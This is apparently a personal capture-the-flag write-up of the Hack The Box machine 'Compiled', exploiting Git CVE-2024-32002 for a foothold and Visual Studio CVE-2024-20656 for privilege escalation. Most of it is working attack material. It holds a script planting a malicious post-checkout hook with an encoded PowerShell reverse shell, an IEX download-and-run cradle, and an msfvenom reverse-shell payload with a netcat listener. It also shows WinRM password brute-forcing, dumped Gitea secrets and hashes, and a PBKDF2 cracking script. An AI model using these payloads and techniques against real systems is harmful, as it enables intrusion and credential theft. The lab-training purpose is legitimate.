---
tags:
  - Windows
  - HTB
  - medium
  - vnc
  - gitea
CVEs: CVE-2024-20656; CVE-2024-32002
creation date: 2024-07-27
Date Completed: 
URL: https://app.hackthebox.com/machines/618
---



users
richard@compiled.htb


# nmap

## 3000
register user
hacker
hack@hacked.com
asdfasdf
found "signature" http://10.129.231.87:3000/richard/Compiled/src/branch/main/venv/Scripts/Activate.ps1

I think this article is telling me i can use this signature to run scripts once I'm on the box [Set-ExecutionPolicy Info](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4#example-7-unblock-a-script-to-run-it-without-changing-the-execution-policy)

## 5000

## 5985

```
crackmapexec winrm $IP -u richard@compiled@htb -p /opt/useful/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

possible PoCs
https://amalmurali.me/posts/git-rce/
https://github.com/amalmurali47/git_rce
https://github.com/amalmurali47/hook

# Foothold 

create the following git repositories
- captain
- hook
run the following on kali:

create_poc.sh
```shell
#!/bin/bash
rm -rf captain hook

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the hook_repo_path path
hook_repo_path="http://compile.htb:3000/hacker/hook.git"

# Initialize the hook repository
git clone "$hook_repo_path"
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANgA0ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m 'post-checkout'
git push

cd ..

# Define the captain_repo_path
captain_repo_path="http://compiled.htb:3000/hacker/captain.git"

# Initialize the captain repository
git clone "$captain_repo_path"
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"


# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
git push
cd ..


```

Submit "captain.git" to http://compiled.htb:5000

```
http://compiled.htb:3000/hacker/captain.git
```

![[Pasted image 20240913134804.png]]

![[Pasted image 20240913134836.png]]

meterpreter > run post/multi/gather/env

![[Pasted image 20240913142648.png]]

![[Pasted image 20240913142708.png]]

cat pwnd
```
ruycr4ft_was_here
```

post/multi/recon/local_exploit_suggester

![[Pasted image 20240913143843.png]]

tried them all... none worked...
```
[+] 10.129.15.120 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.15.120 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.129.15.120 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.15.120 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.15.120 - exploit/windows/local/win_error_cve_2023_36874: The target appears to be vulnerable.
```

## When I return try...

Invoke-RunasC.ps1 with another reverse shell as the user emily who according to winPEAS does not have a password set...

# Second go at it
## rerunning winpeas 
since i didn't bother to save the output last time.......

```
TF=$(mktemp -d); echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py; sudo pip install $TF
```

/data/gitea/conf/app.ini
```
PS C:\Program Files\Gitea\custom\conf> type app.ini
RUN_USER = COMPILED\Richard
APP_NAME = Git
RUN_MODE = prod
WORK_PATH = C:\Program Files\gitea

[ui]
DEFAULT_THEME = arc-green

[database]
DB_TYPE = sqlite3
HOST = 127.0.0.1:3306
NAME = gitea
USER = gitea
PASSWD = 
SCHEMA = 
SSL_MODE = disable
PATH = C:\Program Files\gitea\data\gitea.db
LOG_SQL = false

[repository]
ROOT = C:/Program Files/gitea/data/gitea-repositories

[server]
SSH_DOMAIN = gitea.compiled.htb
DOMAIN = gitea.compiled.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.compiled.htb:3000/
APP_DATA_PATH = C:\Program Files\gitea/data
DISABLE_SSH = false
SSH_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = ten8FWelzw36S77bYSUGlVCmrZn4jncN1ekaH1NoXO4
OFFLINE_MODE = false

[..snip..]

[security]
INSTALL_LOCK = true
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MTY0MDEzMDR9.oQ3gsIgAi1_JTKKbw0lCKjwfcB3v7HvH6Wzb6M7dkE0
PASSWORD_HASH_ALGO = pbkdf2

[oauth2]
JWT_SECRET = XCXy54fFBqA-KAHA0Cjn5wp1gO4l-LY2-qgCS58VJO0

```


## Get a better Shell

sqlite3
```
sqlite3
> .open gitea.db
> .dump
```

from gitea.db
```
administrator:1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d
	salt:a45c43d36dce3076158b19c2c696ef7b
richard:4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e
	salt: d7cf2c96277dd16d95ed5c33bb524b62
emily:97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16
	salt:227d873cca89103cd83a976bdac52486
```

97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16:227d873cca89103cd83a976bdac52486

I went from this basic python script https://cryptobook.nakov.com/mac-and-key-derivation/pbkdf2
to the script below thanks to my new love, gemini

I 💖 gemini
```
import os, binascii, sys
from backports.pbkdf2 import pbkdf2_hmac

target_hash = "97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16"

try:
    with open('/home/kali/tools/rockyou.txt', 'r') as txtfile:
        for line in txtfile:
            line = line.strip()  # Remove leading/trailing whitespace
            if not line:  # Skip empty lines
                continue

            salt = binascii.unhexlify('227d873cca89103cd83a976bdac52486')  # Use the specified salt
            passwd = line.encode("utf8")

            try:
                key = pbkdf2_hmac("sha256", passwd, salt, 50000, 50)
                derived_hash = binascii.hexlify(key).decode('utf-8')
                if derived_hash == target_hash:
                    print(f"Found matching password: {line}")
                    break
            except ValueError:
                print(f"Error deriving key for password '{line}': Password or derived key is too long")
except OSError as e:
    print(f"Could not open/read file: {e}")
    sys.exit(1)
```

emily:12345678

## Foothold

```
evil-winrm -i 10.129.3.69 -u emily -p '12345678'
```

winpeas as emily
```
.\winPEASx64.exe log=wp_emily
```

to list directories in windows
```
gci -force 
```

# Priv Esc Attempts



![[Pasted image 20241004125511.png]]

![[Pasted image 20241004125448.png]]


```
Set-ExecutionPolicy Bypass -Scope CurrentUser
```
Maybe something 

![[Pasted image 20241004142923.png]]

![[Pasted image 20241004143641.png]]


# Thanks Kurt

https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/

https://github.com/Wh04m1001/CVE-2024-20656/tree/main



IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.64/Invoke-PowerShellTcp.ps1')

## getting the exploit

https://github.com/charlesgargasson/CVE-2024-20656

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.64 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o payload.exe

sudo nc -nvlp 443 -s 10.10.15.64
```


```
mkdir c:\exploit
cd c:\exploit
iwr http://10.10.15.64/payload.exe -outfile payload.exe
iwr http://10.10.15.64/Expl.exe -outfile Expl.exe

$VSDiagnostics = get-item "C:\\*\\Microsoft Visual Studio\\*\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe" | select -last 1
c:\exploit\expl.exe $VSDiagnostics.FullName "c:\exploit\payload.exe"
```

## ~~Getting a VNC session~~

use windows/local/payload_inject
![[Pasted image 20241011150111.png]]


![[Pasted image 20241011150045.png]]

future reference on vnc stuff https://www.hackingarticles.in/vnc-penetration-testing/

# Priv Esc Steps

1. evil-winrm into box as emily
2. start a meterpreter session
3. Upgrade your meterpreter session
4. migrate meterpreter session to explorer.exe
5. Do all the things in "get the exploit"
6. Start a netcat listener to catch the call from the payload